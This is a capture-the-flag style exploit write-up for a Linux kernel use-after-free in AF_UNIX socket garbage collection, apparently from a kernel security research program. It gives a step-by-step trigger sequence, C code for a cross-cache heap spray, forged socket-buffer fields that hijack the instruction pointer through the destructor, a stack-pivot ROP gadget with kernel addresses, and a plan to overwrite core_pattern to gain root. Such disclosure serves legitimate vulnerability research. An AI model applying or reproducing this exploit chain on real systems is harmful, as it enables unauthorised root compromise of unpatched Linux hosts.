Exploit Details
===============

In the following, I explain the exploitation process to get a flag on LTS-6.12.56

# Summary
At at high level, the exploit performs the following things:

- create the uninit `scc_index` to make `unix_gc` wrongly collected and purged victim's `oob_skb`
- cross cache to skb with controlled value
- trigger free path with controlled destructor and use ROP to overwrite `core_pattern` and get root


# Triggering Uninit bug
- Describe in the patch (https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=60e6489f8e3b086bd1130ad4450a2c112e863791) 

  1)
    1-a. Create a single cyclic reference with many sockets
    1-b. close() all sockets
    1-c. Trigger GC

  2)
    2-a. Pass sk-A to an embryo sk-B
    2-b. Pass sk-X to sk-X
    2-c. Trigger GC

  3)
    3-a. accept() the embryo sk-B
    3-b. Pass sk-B to sk-C
    3-c. close() the in-flight sk-A
    3-d. Trigger GC

The GC at step 3-d will think sk-A can be collected and purged it's skb.
Before 2-a, we send an OOB msg to sk-A
After the 3 steps we recv the sk-A from sk-B then recv the OOB msg back to trigger `oob_skb` UaF

# Executing cross-cache attack

When we send the OOB msg to sk-A, we send it in the middle. So later when the `oob_skb` got freed, we also free others to make the whole slab get freed and return to buddy allocator.

```c
#define C_CACHE 0x100
    int cross[C_CACHE][2];
    int victim_slab[16][2];
    for(int i=0;i<C_CACHE;i++)
        SYSCHK(socketpair(AF_UNIX,SOCK_STREAM,0,cross[i]));
    for(int i=0;i<16;i++)
        SYSCHK(socketpair(AF_UNIX,SOCK_STREAM,0,victim_slab[i]));

    for(int i=0;i<C_CACHE;i++)
        SYSCHK(send(cross[i][0],buf,1,0));
// cross-cache

    for(int i=0;i<16;i++)
        SYSCHK(send(victim_slab[i][0],buf,1,0));

    SYSCHK(send(skA_pair[1],buf,1,MSG_OOB));

    for(int i=0;i<16;i++)
        SYSCHK(send(victim_slab[i][1],buf,1,0));

// cross-cache
    for(int i=0;i<C_CACHE;i++)
        SYSCHK(send(cross[i][1],buf,1,0));
```

After triggering GC, we freed the skbs that's in the same slab as our victim `oob_skb` by recv msg from `cross` and `victim_slab`. Then we sprayed skb data buffer to reuse the victim `oob_skb` memory.


# Convert the skb UaF primitive to RIP Control
In exploit, after freeing the `oob_skb` in victim sk, we sprayed a lot of skb data buffer with proper data and make `oob_skb->prev` to `KNOWN_ADDR`, which is from [Novel Technique](https://github.com/google/security-research/blob/929630c38837570397e6ed757e80ba48069c64a2/pocs/linux/kernelctf/CVE-2025-38477_cos/docs/novel-techniques.md#leave-payload-next-to-kernel-resource-nperm).
```cpp
    for(int i=0 ;i < sizeof(buf)/PER_SKB ; i++){
        struct sk_buff_data_spray *fake_data = (struct sk_buff_data_spray *)(buf + i * PER_SKB);
        fake_data->next = KNOWN_ADDR;
        fake_data->prev = KNOWN_ADDR;
        fake_data->head = KNOWN_ADDR;
        fake_data->len = 1;
    }
```

After successfully cross-cache `oob_skb` to our controlled data, we can forge `oob_skb->prev` to our `KNOWN_ADDR` with another fake skb
```C
		if (oob_skb->prev != (struct sk_buff *)&sk->sk_receive_queue &&
		    !unix_skb_len(oob_skb->prev)) {
			read_skb = oob_skb->prev;
			__skb_unlink(read_skb, &sk->sk_receive_queue);
		}
	}
...

	consume_skb(read_skb);
```

By free `read_skb`, we can control the kernel RIP by line [1]

```C
void skb_release_head_state(struct sk_buff *skb)
{
	skb_dst_drop(skb);
	if (skb->destructor) {
		DEBUG_NET_WARN_ON_ONCE(in_hardirq());
		skb->destructor(skb); // [1]
	}
```

# Leaking information

After getting RIP control, we need KASLR bypass to do ROP attack. Here we use the CPU prefetch bug to leak kernel slide.

# Post-RIP approaches

In the context, register `rbx` pointed to our `KNOWN_ADDR`, which we can put ROP gadget on it, we first use this gadget to do stack pivot:
```assembly
   0xffffffff817059d3 <ff_layout_encode_io_latency+163>:        push   rbx
   0xffffffff817059d4 <ff_layout_encode_io_latency+164>:        or     BYTE PTR [rbx+0x41],bl
   0xffffffff817059d7 <ff_layout_encode_io_latency+167>:        pop    rsp
   0xffffffff817059d8 <ff_layout_encode_io_latency+168>:        pop    r13
   0xffffffff817059da <ff_layout_encode_io_latency+170>:        pop    r14
   0xffffffff817059dc <ff_layout_encode_io_latency+172>:        pop    rbp
   0xffffffff817059dd <ff_layout_encode_io_latency+173>:        jmp    0xffffffff82843b70 <__x86_return_thunk> ; this is ret instruction
```

Then we use ROP to overwrite `core_pattern` and msleep a long time in kernel, meanwhile we trigger a coredump to get root and cat flag.

